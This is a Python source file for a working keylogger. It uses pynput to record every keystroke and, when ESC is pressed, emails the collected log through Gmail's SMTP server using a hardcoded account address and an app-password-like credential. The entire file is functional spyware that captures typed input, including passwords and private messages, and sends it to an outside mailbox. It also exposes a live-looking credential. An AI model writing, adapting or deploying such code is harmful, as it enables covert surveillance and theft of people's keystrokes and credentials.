import smtplib, ssl
from email.message import EmailMessage
from pynput import keyboard

email = "johndoveisgoat@gmail.com"
passwd = "snygbstrarxwmxwt"

logs_keylogger = ""

def send_email(msg_to_be_sent):
    subject = "Report From IP"
    body = msg_to_be_sent
    email_message = EmailMessage()
    email_message["From"] = email
    email_message["To"] = email
    email_message["Subject"] = subject
    email_message.set_content(body)

    context = ssl.create_default_context()
    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as smtp:
            smtp.login(email, passwd)
            smtp.send_message(email_message)
    except smtplib.SMTPAuthenticationError:
        print("[-] Invalid Email or App Password")
        return
    print("[+] Email Sent Successfully")

def on_press(key):
    global logs_keylogger
    try:
        logs_keylogger += str(key.char)
    except AttributeError:
        logs_keylogger += " [" + str(key) + "] "
    
    if key == keyboard.Key.esc:
        print("[*] ESC pressed. Sending logs and exiting...")
        send_email(logs_keylogger)
        return False

def main():
    print("[*] Starting keylogger... Press ESC to stop and send email.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
